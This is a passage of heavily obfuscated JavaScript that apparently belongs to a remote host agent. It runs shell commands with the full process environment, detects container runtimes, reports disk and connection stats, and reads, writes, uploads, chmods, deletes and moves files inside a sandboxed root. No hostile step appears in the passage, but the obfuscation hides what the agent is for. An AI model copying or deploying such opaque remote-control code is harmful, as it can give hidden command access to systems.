                return a[ey(0x266)];
            if (a0l[ey(0xc25)](a['YuJwq']))
                return 'Podman';
            if (a0l['existsSync']('/proc/1/cgroup')) {
                const b = a0l[ey(0x357)](a[ey(0x847)], ey(0x7d9))[ey(0x426)]();
                if (b['includes'](a[ey(0xc58)]) || b[ey(0x134)](a[ey(0x63e)]))
                    return a[ey(0x266)];
                else {
                    if (b[ey(0x134)](a[ey(0x4d8)]))
                        return a[ey(0xce5)];
                    else {
                        if (b[ey(0x134)](a['IQpcR']))
                            return ey(0xb9a);
                    }
                }
            }
            if (a0l['existsSync'](a['QMlKp'])) {
                const c = a0l[ey(0x357)](a['QMlKp'], a[ey(0x43f)]);
                if (c[ey(0x134)](a['xeQmL']) || c[ey(0x134)](a[ey(0xb16)]))
                    return a[ey(0x266)];
                else {
                    if (c[ey(0x134)](a[ey(0xa92)]) || c[ey(0x134)](a[ey(0xbcc)]))
                        return a[ey(0xce5)];
                }
            }
            if (a0l[ey(0xc25)](a[ey(0xaae)])) {
                const d = a0l[ey(0x357)](a[ey(0xaae)], a[ey(0x43f)]);
                if (d[ey(0x134)](a['izsMb']))
                    return a[ey(0x65f)];
            }
            if (a0l[ey(0xc25)](a['YXvNQ'])) {
                const f = a0l['readFileSync'](a[ey(0x9f0)], a[ey(0x43f)]);
                if (f[ey(0x134)](a['bPSbR']) || f['includes'](ey(0xd39)))
                    return a['bPSbR'];
            }
        } catch (g) {
        }
        return a[ey(0x933)];
    }
    async [a0cm(0x220)]() {
        const ez = a0cm, a = {
                'qXAOT': function (b, c) {
                    return b > c;
                },
                'MhmUk': function (b, c) {
                    return b !== c;
                },
                'tQHhP': ez(0x740),
                'gflDk': function (b, c) {
                    return b !== c;
                },
                'diJNc': ez(0x154),
                'UTpjt': ez(0xa46)
            };
        try {
            const b = await a0u[ez(0xcaf)](), c = b['filter'](g => {
                    const eA = ez;
                    return a[eA(0xc9e)](g[eA(0x883)], 0x0) && a[eA(0x4f2)](g[eA(0x483)], a['tQHhP']) && a[eA(0x22f)](g['type'], a[eA(0x4ae)]) && g['fs'][eA(0x830)](a[eA(0xc19)]);
                }), d = c['reduce']((g, h) => g + h['size'], 0x0), f = c[ez(0x2ec)]((g, h) => g + h[ez(0x3d5)], 0x0);
            return {
                'total': d,
                'used': f
            };
        } catch {
            return {
                'total': 0x0,
                'used': 0x0
            };
        }
    }
    async ['_getConnections']() {
        const eB = a0cm;
        try {
            const a = await a0u[eB(0x845)](), b = a[eB(0x88f)](d => d[eB(0x56f)] === eB(0x7fa))['length'], c = a[eB(0x88f)](d => d[eB(0x56f)] === 'udp')['length'];
            return {
                'tcp': b,
                'udp': c
            };
        } catch {
            return {
                'tcp': 0x0,
                'udp': 0x0
            };
        }
    }
}
class a0ad {
    static async ['execute'](a, b = {}) {
        const eC = a0cm, c = {
                'BRNoh': function (d, f) {
                    return d || f;
                },
                'MpEgZ': function (d, f) {
                    return d === f;
                },
                'MGLDW': function (d, f) {
                    return d(f);
                },
                'boKlR': function (d, f, g, h) {
                    return d(f, g, h);
                },
                'IcxIk': function (d, f) {
                    return d * f;
                },
                'DFJwh': function (d, f) {
                    return d * f;
                },
                'OBUfk': function (d, f) {
                    return d * f;
                }
            }, {
                cwd: cwd = process[eC(0x733)](),
                env: env = {},
                timeout: timeout = a0a1[eC(0x6de)]
            } = b;
        return new Promise(d => {
            const eD = eC, f = Date[eD(0x866)](), g = c[eD(0x70b)](a0r, a, {
                    'cwd': cwd,
                    'env': {
                        ...process.env,
                        ...env
                    },
                    'timeout': c[eD(0xa9a)](timeout, 0x3e8),
                    'maxBuffer': c[eD(0x3f5)](c['OBUfk'](0xa, 0x400), 0x400)
                }, (h, i, j) => {
                    const eE = eD, k = Date[eE(0x866)]() - f, l = h && h['killed'] && h[eE(0x861)];
                    let m = c['BRNoh'](i, '');
                    if (j)
                        m += j;
                    let n = 0x0;
                    if (h) {
                        if (l)
                            n = 0x7c;
                        else
                            c[eE(0xa77)](typeof h[eE(0xa2f)], eE(0x6a7)) ? n = h[eE(0xa2f)] : n = -0x1;
                    }
                    c['MGLDW'](d, {
                        'result': m,
                        'exitcode': n,
                        'timeout': l,
                        'cmd': a
                    });
                });
        });
    }
}
function a0ae(a) {
    const eF = a0cm, b = {
            'iEiqi': function (c, d) {
                return c === d;
            }
        };
    try {
        const c = a0l[eF(0x3d0)][eF(0x8de)](a0o[eF(0x48d)](a0a1[eF(0xa0f)])), d = a0o[eF(0x48d)](a);
        let f = d;
        while (!a0l[eF(0xc25)](f)) {
            const j = a0o[eF(0xbfd)](f);
            if (b[eF(0xbe1)](j, f))
                return ![];
            f = j;
        }
        const g = a0l['realpathSync']['native'](f), h = a0o[eF(0xf3)](c, g);
        if (h['startsWith']('..') || a0o['isAbsolute'](h))
            return ![];
        const i = a0o[eF(0xf3)](f, d);
        if (i && (i[eF(0x830)]('..') || a0o['isAbsolute'](i)))
            return ![];
        return !![];
    } catch (k) {
        return ![];
    }
}
class a0af {
    static ['ZIP_MAX_ENTRIES'] = 0x4e20;
    static [a0cm(0x5bb)] = 0x200 * 0x400 * 0x400;
    static [a0cm(0xd11)] = 0x1f4;
    static ['_crcTable'] = null;
    static [a0cm(0x14a)](a) {
        const eG = a0cm, b = {
                'MtgIW': function (g, h) {
                    return g < h;
                },
                'RDpXf': function (g, h) {
                    return g >>> h;
                },
                'wCTzu': function (g, h) {
                    return g >>> h;
                },
                'CfEXY': function (g, h) {
                    return g ^ h;
                },
                'kozEw': function (g, h) {
                    return g >>> h;
                },
                'vUCOz': function (g, h) {
                    return g & h;
                },
                'VDcUc': function (g, h) {
                    return g >>> h;
                }
            };
        if (!a0af[eG(0x6a4)]) {
            const g = new Int32Array(0x100);
            for (let h = 0x0; h < 0x100; h++) {
                let j = h;
                for (let l = 0x0; b['MtgIW'](l, 0x8); l++)
                    j = j & 0x1 ? 0xedb88320 ^ b[eG(0x526)](j, 0x1) : b[eG(0x151)](j, 0x1);
                g[h] = j;
            }
            a0af[eG(0x6a4)] = g;
        }
        const d = a0af[eG(0x6a4)];
        let f = -0x1;
        for (let m = 0x0; b[eG(0x6bb)](m, a[eG(0x55c)]); m++)
            f = b['CfEXY'](b['kozEw'](f, 0x8), d[b[eG(0x8e6)](b[eG(0xa56)](f, a[m]), 0xff)]);
        return b['VDcUc'](f ^ -0x1, 0x0);
    }
    static [a0cm(0x211)](a) {
        const eH = a0cm, b = {
                'eftqe': function (g, h) {
                    return g & h;
                },
                'xAvfj': function (g, h) {
                    return g | h;
                },
                'nWNim': function (g, h) {
                    return g << h;
                },
                'MTMon': function (g, h) {
                    return g >> h;
                },
                'FIjLr': function (g, h) {
                    return g - h;
                },
                'XsZJV': function (g, h) {
                    return g + h;
                }
            }, c = b[eH(0xc24)](b[eH(0x9a7)](b[eH(0x863)](a[eH(0xbc2)](), 0xb), a[eH(0xc21)]() << 0x5) | b[eH(0x501)](a[eH(0x6dd)](), 0x1), 0xffff), f = b[eH(0xc24)](b[eH(0x9df)](a[eH(0x7ee)](), 0x7bc) << 0x9 | b[eH(0x113)](a[eH(0xc80)](), 0x1) << 0x5 | a[eH(0x82e)](), 0xffff);
        return {
            'time': c,
            'date': f
        };
    }
    static [a0cm(0x9ab)](a) {
        const eI = a0cm, b = {
                'gSABO': function (i, j) {
                    return i - j;
                },
                'eFvKe': function (i, j) {
                    return i >= j;
                },
                'fWohi': eI(0x7d9),
                'WqlUW': function (i, j) {
                    return i < j;
                },
                'nqqEu': function (i, j) {
                    return i(j);
                },
                'fSgwS': function (i, j) {
                    return i + j;
                }
            }, c = a0l['openSync'](a, 'w'), d = [];
        let f = 0x0, g = 0x0;
        const h = i => {
            const eJ = eI;
            let j = 0x0;
            while (j < i[eJ(0x55c)])
                j += a0l[eJ(0x1f5)](c, i, j, b['gSABO'](i[eJ(0x55c)], j));
        };
        return {
            'add'(i, j, k, l = ![]) {
                const eK = eI;
                if (b[eK(0x98b)](g, a0af[eK(0x8c1)]))
                    return ![];
                const m = Buffer[eK(0x1e7)](i, b[eK(0x836)]);
                j = j || Buffer[eK(0x2d9)](0x0);
                const n = l ? 0x0 : a0af[eK(0x14a)](j);
                let o = 0x0, p = j;
                if (!l && j[eK(0x55c)] > 0x0) {
                    const u = a0n[eK(0x463)](j, { 'level': 0x6 });
                    b['WqlUW'](u[eK(0x55c)], j[eK(0x55c)]) && (o = 0x8, p = u);
                }
                const {
                        time: q,
                        date: r
                    } = a0af[eK(0x211)](k || new Date()), s = Buffer[eK(0x2d9)](0x1e);
                s[eK(0x775)](0x4034b50, 0x0), s[eK(0x3cf)](0x14, 0x4), s['writeUInt16LE'](0x800, 0x6), s[eK(0x3cf)](o, 0x8), s[eK(0x3cf)](q, 0xa), s[eK(0x3cf)](r, 0xc), s[eK(0x775)](n, 0xe), s[eK(0x775)](p[eK(0x55c)], 0x12), s[eK(0x775)](j[eK(0x55c)], 0x16), s[eK(0x3cf)](m[eK(0x55c)], 0x1a), s[eK(0x3cf)](0x0, 0x1c), h(s), h(m), b[eK(0x46e)](h, p);
                const t = Buffer[eK(0x2d9)](0x2e);
                return t['writeUInt32LE'](0x2014b50, 0x0), t[eK(0x3cf)](0x14, 0x4), t[eK(0x3cf)](0x14, 0x6), t['writeUInt16LE'](0x800, 0x8), t[eK(0x3cf)](o, 0xa), t[eK(0x3cf)](q, 0xc), t['writeUInt16LE'](r, 0xe), t[eK(0x775)](n, 0x10), t[eK(0x775)](p[eK(0x55c)], 0x14), t[eK(0x775)](j[eK(0x55c)], 0x18), t[eK(0x3cf)](m[eK(0x55c)], 0x1c), t[eK(0x3cf)](0x0, 0x1e), t[eK(0x3cf)](0x0, 0x20), t[eK(0x3cf)](0x0, 0x22), t['writeUInt16LE'](0x0, 0x24), t[eK(0x775)](l ? 0x10 : 0x0, 0x26), t[eK(0x775)](f, 0x2a), d[eK(0x1d5)](t, m), f += b[eK(0x35a)](0x1e, m['length']) + p['length'], g++, !![];
            },
            'close'() {
                const eL = eI, i = Buffer['concat'](d), j = Buffer[eL(0x2d9)](0x16);
                return j['writeUInt32LE'](0x6054b50, 0x0), j[eL(0x3cf)](0x0, 0x4), j[eL(0x3cf)](0x0, 0x6), j[eL(0x3cf)](g, 0x8), j[eL(0x3cf)](g, 0xa), j[eL(0x775)](i[eL(0x55c)], 0xc), j[eL(0x775)](f, 0x10), j[eL(0x3cf)](0x0, 0x14), b[eL(0x46e)](h, i), b[eL(0x46e)](h, j), a0l[eL(0x200)](c), g;
            }
        };
    }
    static [a0cm(0x881)](a) {
        const eM = a0cm, b = {
                'qBofM': function (n, o) {
                    return n + o;
                },
                'cPpQM': function (n, o) {
                    return n - o;
                },
                'Yrpjc': function (n, o) {
                    return n < o;
                },
                'RImKq': eM(0x2cc),
                'fyBSR': function (n, o) {
                    return n + o;
                },
                'jqBXD': function (n, o) {
                    return n <= o;
                },
                'cQLWC': function (n, o) {
                    return n + o;
                },
                'FDvhF': function (n, o) {
                    return n + o;
                },
                'EYxxC': function (n, o) {
                    return n + o;
                },
                'kekUK': function (n, o) {
                    return n + o;
                },
                'DIEYg': eM(0x7d9),
                'JNLDW': function (n, o) {
                    return n + o;
                },
                'lCshC': function (n, o) {
                    return n !== o;
                },
                'HDPcD': function (n, o) {
                    return n !== o;
                },
                'Xwuct': function (n, o) {
                    return n === o;
                },
                'Okspy': function (n, o) {
                    return n === o;
                },
                'Infrg': function (n, o) {
                    return n + o;
                },
                'JBZeg': function (n, o) {
                    return n + o;
                }
            }, c = a0l[eM(0x357)](a);
        let d = -0x1;
        const f = Math[eM(0x60c)](0x0, c[eM(0x55c)] - b['qBofM'](0xffff, 0x16));
        for (let n = b['cPpQM'](c[eM(0x55c)], 0x16); n >= f; n--) {
            if (c[eM(0x862)](n) === 0x6054b50) {
                d = n;
                break;
            }
        }
        if (b['Yrpjc'](d, 0x0))
            throw new Error(b['RImKq']);
        const g = c[eM(0xd38)](b[eM(0xbd9)](d, 0xa)), h = c['readUInt32LE'](b[eM(0x935)](d, 0xc)), j = c[eM(0x862)](b['qBofM'](d, 0x10)), k = [];
        let l = j;
        const m = j + h;
        for (let o = 0x0; o < g && b[eM(0x3d7)](b[eM(0x935)](l, 0x2e), m); o++) {
            if (c[eM(0x862)](l) !== 0x2014b50)
                break;
            const q = c[eM(0xd38)](b['cQLWC'](l, 0x8)), r = c[eM(0xd38)](b['cQLWC'](l, 0xa)), s = c['readUInt32LE'](l + 0x10), t = c[eM(0x862)](b[eM(0x48a)](l, 0x14)), u = c['readUInt32LE'](b[eM(0x48a)](l, 0x18)), v = c[eM(0xd38)](b[eM(0xbbc)](l, 0x1c)), w = c[eM(0xd38)](b[eM(0x48a)](l, 0x1e)), x = c[eM(0xd38)](l + 0x20), y = c[eM(0x862)](b[eM(0x48a)](l, 0x26)), z = c[eM(0x862)](b[eM(0xdad)](l, 0x2a)), A = c[eM(0x2d5)](b['EYxxC'](l, 0x2e), b[eM(0xbbc)](b['kekUK'](l, 0x2e), v))[eM(0x7a0)](b[eM(0x221)]);
            l += b[eM(0x125)](b[eM(0x48a)](0x2e, v) + w, x);
            const B = {
                'name': A,
                'isDir': A[eM(0xb13)]('/') || b['lCshC'](y & 0x10, 0x0),
                'method': r,
                'crc': s,
                'size': u,
                'compressedSize': t,
                'encrypted': b[eM(0xad6)](q & 0x1, 0x0),
                'zip64': b['Xwuct'](t, 0xffffffff) || b[eM(0x3c9)](u, 0xffffffff) || b[eM(0xaf0)](z, 0xffffffff),
                'data': null
            };
            if (!B[eM(0x681)] && !B[eM(0xbb9)] && !B[eM(0x8fb)]) {
                if (b[eM(0x125)](z, 0x1e) <= c[eM(0x55c)] && c[eM(0x862)](z) === 0x4034b50) {
                    const C = c[eM(0xd38)](z + 0x1a), D = c[eM(0xd38)](b[eM(0xdad)](z, 0x1c)), E = b[eM(0xbbc)](b[eM(0x9d8)](z + 0x1e, C), D);
                    b['JBZeg'](E, t) <= c['length'] && (B[eM(0x5f8)] = c['slice'](E, E + t));
                }
            }
            k[eM(0x1d5)](B);
        }
        return k;
    }
    static [a0cm(0xcdb)](a) {
        const eN = a0cm, b = {
                'XeDJy': function (c, d) {
                    return c === d;
                }
            };
        if (b[eN(0xcd6)](a['method'], 0x0))
            return a[eN(0x5f8)];
        if (a[eN(0x394)] === 0x8)
            return a0n[eN(0x228)](a[eN(0x5f8)]);
        throw new Error('Unsupported\x20zip\x20method:\x20' + a[eN(0x394)]);
    }
}
class a0ag {
    static async [a0cm(0x730)](a, b = ![]) {
        const eO = a0cm, c = {
                'IywlE': eO(0x718),
                'rMUjH': eO(0xa54),
                'tFoBd': function (h, i) {
                    return h & i;
                },
                'DhKDB': function (h, i) {
                    return h(i);
                },
                'MhDSM': function (h, i) {
                    return h || i;
                },
                'YbPvC': eO(0x4c1),
                'GNdlr': eO(0xb59),
                'jCwFM': function (h, i) {
                    return h(i);
                }
            }, d = a0o[eO(0x48d)](a0a1[eO(0xa0f)], c[eO(0xc72)](a, '.'));
        if (!a0ae(d))
            throw new Error(c[eO(0x4b2)]);
        if (!a0l[eO(0xc25)](d))
            throw new Error(c[eO(0x302)]);
        const f = [], g = h => {
                const eP = eO, i = a0l[eP(0x3f4)](h);
                for (const j of i) {
                    const k = a0o[eP(0x455)](h, j), l = a0l['statSync'](k), m = new a0X();
                    m[eP(0xbc6)] = j, m[eP(0xa3d)] = a0o[eP(0xf3)](a0a1['FILE_ROOT'], k), m[eP(0x483)] = l[eP(0x5fc)]() ? c[eP(0x927)] : c[eP(0x773)], m[eP(0x883)] = l['size'], m[eP(0x970)] = l[eP(0x970)][eP(0x213)](), m[eP(0x87c)] = this['_formatMode'](l[eP(0x87c)], l[eP(0x5fc)]()), m['mode_octal'] = '0o' + c['tFoBd'](l[eP(0x87c)], 0x1ff)[eP(0x7a0)](0x8), m[eP(0xd9a)] = l['uid'] + ':' + l[eP(0xfe)], f['push'](m), b && l['isDirectory']() && c[eP(0xa91)](g, k);
                }
            };
        return c[eO(0x7c2)](g, d), f;
    }
    static async [a0cm(0x23f)](a) {
        const eQ = a0cm, b = {
                'HySeZ': function (d, f) {
                    return d(f);
                },
                'dqGQz': function (d, f) {
                    return d & f;
                },
                'vcmVV': eQ(0x718),
                'atBgc': eQ(0xa54)
            }, c = [];
        for (const d of a) {
            const f = a0o[eQ(0x48d)](a0a1[eQ(0xa0f)], d);
            if (!b[eQ(0x65b)](a0ae, f))
                continue;
            try {
                const g = a0l[eQ(0xc6d)](f), h = this[eQ(0x1b3)](f, a0l[eQ(0x680)][eQ(0xbc0)]), i = this['_checkAccess'](f, a0l[eQ(0x680)][eQ(0x96a)]), j = this[eQ(0x1b3)](f, a0l[eQ(0x680)]['X_OK']), k = new a0Y();
                k[eQ(0xa3d)] = a0o[eQ(0xf3)](a0a1[eQ(0xa0f)], f), k[eQ(0xbc6)] = a0o[eQ(0x814)](f), k[eQ(0x87c)] = this[eQ(0x4e6)](g['mode'], g[eQ(0x5fc)]()), k['mode_octal'] = '0o' + b['dqGQz'](g[eQ(0x87c)], 0x1ff)['toString'](0x8), k[eQ(0x483)] = g[eQ(0x5fc)]() ? b[eQ(0x7cb)] : b[eQ(0x9b0)], k['readable'] = h, k[eQ(0x139)] = i, k[eQ(0x95b)] = j, c[eQ(0x1d5)](k);
            } catch (l) {
            }
        }
        return c;
    }
    static [a0cm(0x1b3)](a, b) {
        const eR = a0cm;
        try {
            return a0l[eR(0x3fc)](a, b), !![];
        } catch {
            return ![];
        }
    }
    static ['_parseMode'](a) {
        const eS = a0cm, b = {
                'yvPpY': function (c, d) {
                    return c === d;
                },
                'TLZYX': eS(0x6a7),
                'YgDuG': function (c, d) {
                    return c === d;
                },
                'OFZjM': eS(0x12a),
                'TYjdl': function (c, d, f) {
                    return c(d, f);
                },
                'mkPUm': eS(0x70c)
            };
        if (b[eS(0x40c)](typeof a, b[eS(0xd0e)]))
            return a;
        if (b[eS(0x140)](typeof a, b[eS(0xd0f)])) {
            const c = a['trim']();
            if (/^[0-7]{3,4}$/[eS(0xdb7)](c))
                return b[eS(0x465)](parseInt, c, 0x8);
        }
        throw new Error(b[eS(0x27a)]);
    }
    static [a0cm(0x4e6)](a, b) {
        const eT = a0cm, c = {
                'hOuER': function (i, j, k) {
                    return i(j, k);
                }
            }, d = b ? 'd' : '-', f = [
                'r',
                'w',
                'x'
            ], g = (a & 0x1ff)[eT(0x7a0)](0x8)['padStart'](0x3, '0');
        let h = d;
        for (const i of g) {
            const j = c['hOuER'](parseInt, i, 0xa);
            h += f[eT(0x8a0)]((k, l) => j & 0x4 >> l ? k : '-')['join']('');
        }
        return h;
    }
    static async ['setFilePermissions'](a, b = ![]) {
        const eU = a0cm, c = {
                'ThRdL': function (g, h) {
                    return g(h);
                },
                'OMXAj': function (g, h) {
                    return g(h);
                },
                'EPvxM': function (g, h) {
                    return g(h);
                },
                'sBRSJ': 'access_denied',
                'vxjCb': function (g, h) {
                    return g(h);
                },
                'qANZk': eU(0xaa0)
            }, d = [];
        for (const [g, h] of Object[eU(0x1c8)](a)) {
            const i = a0o[eU(0x48d)](a0a1['FILE_ROOT'], g);
            if (!c['EPvxM'](a0ae, i)) {
                d[eU(0x1d5)]({
                    'path': g,
                    'requested': c[eU(0xd80)](String, h),
                    'applied': '',
                    'mode_octal': '',
                    'status': c['sBRSJ']
                });
                continue;
            }
            try {
                const j = this['_parseMode'](h), k = m => {
                        const eV = eU;
                        a0l[eV(0xae1)](m, j);
                    };
                if (b && a0l[eU(0xc25)](i) && a0l[eU(0xc6d)](i)['isDirectory']()) {
                    const m = n => {
                        const eW = eU;
                        c[eW(0x25e)](k, n);
                        const o = a0l[eW(0x3f4)](n);
                        for (const p of o) {
                            const q = a0o[eW(0x455)](n, p);
                            a0l[eW(0xc6d)](q)[eW(0x5fc)]() ? c[eW(0x25e)](m, q) : c[eW(0xabb)](k, q);
                        }
                    };
                    m(i);
                } else
                    c['OMXAj'](k, i);
                const l = j[eU(0x7a0)](0x8);
                d['push']({
                    'path': g,
                    'requested': c[eU(0xcb7)](String, h),
                    'applied': l,
                    'mode_octal': '0o' + l,
                    'status': 'ok'
                });
            } catch (n) {
                d['push']({
                    'path': g,
                    'requested': c[eU(0x25e)](String, h),
                    'applied': '',
                    'mode_octal': '',
                    'status': c[eU(0x770)],
                    'message': n[eU(0xbe8)]
                });
            }
        }
        const f = d['filter'](o => o['status'] === 'ok')[eU(0x55c)];
        return {
            'status': 'ok',
            'total': d[eU(0x55c)],
            'success': f,
            'results': d
        };
    }
    static async [a0cm(0x23c)](a) {
        const eX = a0cm, b = {
                'JGuWU': function (h, i) {
                    return h(i);
                },
                'YxOwO': eX(0x4c1),
                'pVqas': function (h, i) {
                    return h * i;
                },
                'lNEeJ': eX(0xd83),
                'NSSNs': eX(0x497)
            }, c = a0o['resolve'](a0a1[eX(0xa0f)], a);
        if (!b[eX(0x43e)](a0ae, c))
            throw new Error(b[eX(0xb85)]);
        const d = a0l[eX(0xc6d)](c);
        if (d[eX(0x883)] > b[eX(0x172)](0x400, 0x400))
            throw new Error(b[eX(0xa79)]);
        const f = a0l[eX(0x357)](c), g = this[eX(0xd6b)](f);
        return {
            'status': 'ok',
            'path': a0o[eX(0xf3)](a0a1[eX(0xa0f)], c),
            'content': g ? a0w[eX(0x589)](f) : f['toString'](eX(0x7d9)),
            'encoding': g ? eX(0x5bd) : b[eX(0xc04)],
            'is_binary': g,
            'size': d[eX(0x883)]
        };
    }
    static ['_isBinary'](a) {
        const eY = a0cm, b = {
                'ombdG': function (c, d) {
                    return c === d;
                }
            };
        if (!a || a['length'] === 0x0)
            return ![];
        for (let c = 0x0; c < Math['min'](a[eY(0x55c)], 0x200); c++) {
            if (b[eY(0xc20)](a[c], 0x0))
                return !![];
        }
        return ![];
    }
    static async [a0cm(0x5a5)](a, b, c, d = null, f = null) {
        const eZ = a0cm, g = {
                'SnWyM': function (l, m) {
                    return l(m);
                },
                'lflJn': eZ(0x4c1),
                'zhbGi': function (l, m) {
                    return l > m;
                },
                'VgjHo': 'File\x20too\x20large',
                'vrEzQ': function (l, m) {
                    return l !== m;
                },
                'vdZil': eZ(0x445),
                'CBarK': '.upload_chunks',
                'PpbRG': function (l, m) {
                    return l < m;
                }
            }, h = a0o['resolve'](a0a1[eZ(0xa0f)], a);
        let j = h;
        b && (j = a0o['join'](h, b));
        if (!g[eZ(0x428)](a0ae, j))
            throw new Error(g[eZ(0x6ff)]);
        !a0l[eZ(0xc25)](a0o[eZ(0xbfd)](j)) && a0l['mkdirSync'](a0o[eZ(0xbfd)](j), { 'recursive': !![] });
        const k = a0w['toByteArray'](c);
        if (g[eZ(0x51c)](k[eZ(0x55c)], a0a1[eZ(0xa58)]))
            throw new Error(g[eZ(0x931)]);
        if (d !== null && g[eZ(0xa5d)](f, null)) {
            const l = g[eZ(0x428)](Number, d), m = Number(f);
            if (Number[eZ(0x30a)](l) || Number['isNaN'](m))
                throw new Error(g[eZ(0x9a9)]);
            const n = a0o[eZ(0x455)](a0o['dirname'](j), g[eZ(0x653)], a0o[eZ(0x814)](j));
            !a0l[eZ(0xc25)](n) && a0l[eZ(0x8a8)](n, { 'recursive': !![] });
            const o = a0o[eZ(0x455)](n, eZ(0xc7f) + l);
            a0l[eZ(0x660)](o, k);
            const p = a0l[eZ(0x3f4)](n)[eZ(0x88f)](s => s[eZ(0x830)](eZ(0xc7f))), q = p[eZ(0x55c)], r = q === m;
            if (r) {
                const s = a0l['createWriteStream'](j);
                for (let u = 0x0; g[eZ(0xafe)](u, m); u++) {
                    const v = a0o[eZ(0x455)](n, eZ(0xc7f) + u);
                    if (!a0l[eZ(0xc25)](v)) {
                        s[eZ(0x7bc)]();
                        throw new Error(eZ(0x6cd) + u);
                    }
                    s[eZ(0x10b)](a0l['readFileSync'](v));
                }
                s[eZ(0x536)]();
                const t = a0o[eZ(0xbfd)](n);
                a0l[eZ(0x88e)](n, {
                    'recursive': !![],
                    'force': !![]
                });
                try {
                    a0l[eZ(0xca1)](t);
                } catch (w) {
                }
            }
            return {
                'status': 'ok',
                'path': a0o[eZ(0xf3)](a0a1[eZ(0xa0f)], j),
                'received': q,
                'total': m,
                'chunked': !![]
            };
        }
        return a0l['writeFileSync'](j, k), {
            'status': 'ok',
            'path': a0o[eZ(0xf3)](a0a1[eZ(0xa0f)], j),
            'received': k[eZ(0x55c)],
            'total': k['length'],
            'chunked': ![]
        };
    }
    static async [a0cm(0x2e7)](a, b, c, d = null, f = null) {
        const f0 = a0cm, g = {
                'gXTLO': function (k, l) {
                    return k(l);
                },
                'EYtnR': f0(0x4c1),
                'UrRIt': function (k, l) {
                    return k !== l;
                },
                'EBVlH': function (k, l) {
                    return k !== l;
                },
                'LOPWU': function (k, l) {
                    return k(l);
                },
                'joVSy': function (k, l) {
                    return k(l);
                },
                'QSVSl': 'chunk_id\x20and\x20total_chunks\x20must\x20be\x20numeric',
                'dBSKS': function (k, l) {
                    return k === l;
                },
                'RibCy': function (k, l) {
                    return k < l;
                },
                'WUjkk': f0(0x149),
                'OsBjv': f0(0x2e6)
            }, h = a0o[f0(0x48d)](a0a1[f0(0xa0f)], a || '.');
        let j = h;
        b && (j = a0o[f0(0x455)](h, b));
        if (!g[f0(0x3ec)](a0ae, j))
            throw new Error(g['EYtnR']);
        !a0l[f0(0xc25)](a0o[f0(0xbfd)](j)) && a0l[f0(0x8a8)](a0o[f0(0xbfd)](j), { 'recursive': !![] });
        if (c[f0(0x55c)] > a0a1[f0(0xa58)])
            throw new Error(f0(0xd83));
        if (g[f0(0x4be)](d, null) && g['EBVlH'](f, null)) {
            const k = g['LOPWU'](Number, d), l = g[f0(0xaa9)](Number, f);
            if (Number[f0(0x30a)](k) || Number[f0(0x30a)](l))
                throw new Error(g[f0(0x1fa)]);
            const m = a0o['join'](a0o[f0(0xbfd)](j), f0(0x308), a0o['basename'](j));
            !a0l[f0(0xc25)](m) && a0l['mkdirSync'](m, { 'recursive': !![] });
            const n = a0o[f0(0x455)](m, f0(0xc7f) + k);
            a0l['writeFileSync'](n, c);
            const o = a0l[f0(0x3f4)](m)[f0(0x88f)](r => r['startsWith'](f0(0xc7f))), p = o[f0(0x55c)], q = g['dBSKS'](p, l);
            if (q) {
                const r = [];
                for (let t = 0x0; g[f0(0x650)](t, l); t++) {
                    const u = a0o[f0(0x455)](m, f0(0xc7f) + t);
                    if (!a0l[f0(0xc25)](u))
                        throw new Error(f0(0x6cd) + t);
                    r['push'](a0l[f0(0x357)](u));
                }
                a0l[f0(0x660)](j, Buffer[f0(0x5f9)](r));
                const s = a0o[f0(0xbfd)](m);
                a0l[f0(0x88e)](m, {
                    'recursive': !![],
                    'force': !![]
                });
                try {
                    a0l[f0(0xca1)](s);
                } catch (v) {
                }
                return {
                    'status': 'ok',
                    'path': a0o[f0(0xf3)](a0a1[f0(0xa0f)], j),
                    'chunk_id': k,
                    'completed': !![],
                    'message': g[f0(0x5e9)]
                };
            }
            return {
                'status': 'ok',
                'path': a0o[f0(0xf3)](a0a1['FILE_ROOT'], j),
                'chunk_id': k,
                'completed': ![],
                'message': f0(0xb3b) + k + f0(0x56c)
            };
        }
        return a0l[f0(0x660)](j, c), {
            'status': 'ok',
            'path': a0o[f0(0xf3)](a0a1['FILE_ROOT'], j),
            'chunk_id': 0x0,
            'completed': !![],
            'message': g[f0(0x307)]
        };
    }
    static async [a0cm(0x3b5)](a) {
        const f1 = a0cm, b = { 'SoVIa': 'File\x20not\x20found' }, c = a0o[f1(0x48d)](a0a1[f1(0xa0f)], a);
        if (!a0ae(c))
            throw new Error(f1(0x4c1));
        if (!a0l[f1(0xc25)](c))
            throw new Error(b[f1(0x1d3)]);
        const d = a0l['statSync'](c), f = await a0l[f1(0x55b)]['readFile'](c);
        return {
            'path': a0o['relative'](a0a1[f1(0xa0f)], c),
            'content': f,
            'size': d[f1(0x883)]
        };
    }
    static async [a0cm(0x4fd)](a) {
        const f2 = a0cm, b = {
                'cgsDU': function (d, f) {
                    return d(f);
                },
                'WjVQb': f2(0xb87),
                'uUlxo': f2(0x7e7),
                'RoYmT': 'error'
            }, c = [];
        for (const d of a) {
            const f = a0o[f2(0x48d)](a0a1[f2(0xa0f)], d);
            if (!b[f2(0x677)](a0ae, f)) {
                c[f2(0x1d5)]({
                    'path': d,
                    'status': b[f2(0xd4b)]
                });
                continue;
            }
            try {
                if (a0l['existsSync'](f)) {
                    const g = a0l[f2(0xc6d)](f);
                    g[f2(0x5fc)]() ? a0l[f2(0x88e)](f, {
                        'recursive': !![],
                        'force': !![]
                    }) : a0l['unlinkSync'](f), c[f2(0x1d5)]({
                        'path': d,
                        'status': b[f2(0x629)]
                    });
                } else
                    c[f2(0x1d5)]({
                        'path': d,
                        'status': 'not_found'
                    });
            } catch (h) {
                c[f2(0x1d5)]({
                    'path': d,
                    'status': b['RoYmT'],
                    'message': h['message']
                });
            }
        }
        return c;
    }
    static async [a0cm(0x104)](a) {
        const f3 = a0cm, b = {
                'uuLSC': function (d, f) {
                    return d(f);
                },
                'gKwee': f3(0xb87),
                'mNtUc': f3(0xaa0)
            }, c = [];
        for (const [d, f] of Object[f3(0x1c8)](a)) {
            const g = a0o[f3(0x48d)](a0a1[f3(0xa0f)], d), h = a0o[f3(0x48d)](a0a1[f3(0xa0f)], f);
            if (!b[f3(0x85f)](a0ae, g) || !b[f3(0x85f)](a0ae, h)) {
                c['push']({
                    'from': d,
                    'to': f,
                    'status': b[f3(0x30e)]
                });
                continue;
            }
            try {
                const i = a0o[f3(0xbfd)](h);
                !a0l['existsSync'](i) && a0l[f3(0x8a8)](i, { 'recursive': !![] }), a0l[f3(0x598)](g, h), c['push']({
                    'from': d,
                    'to': f,
                    'status': 'ok'
                });
            } catch (j) {
